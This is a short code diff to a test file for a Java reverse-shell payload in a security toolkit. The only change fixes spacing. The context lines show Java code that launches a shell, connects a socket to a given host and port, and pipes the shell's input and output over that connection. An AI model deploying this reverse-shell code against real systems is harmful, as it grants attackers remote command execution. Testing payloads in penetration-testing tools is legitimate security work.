@@ -48,7 +48,7 @@ describe Ronin::Payloads::Java::ReverseShell do
           		Process process = new ProcessBuilder(shell).redirectErrorStream(true).start();
           		Socket socket = new Socket(host,port);
 
-          		InputStream process_input =process.getInputStream();
+          		InputStream process_input = process.getInputStream();
           		InputStream process_error = process.getErrorStream();
           		InputStream socket_input = socket.getInputStream();
           		OutputStream process_output = process.getOutputStream();
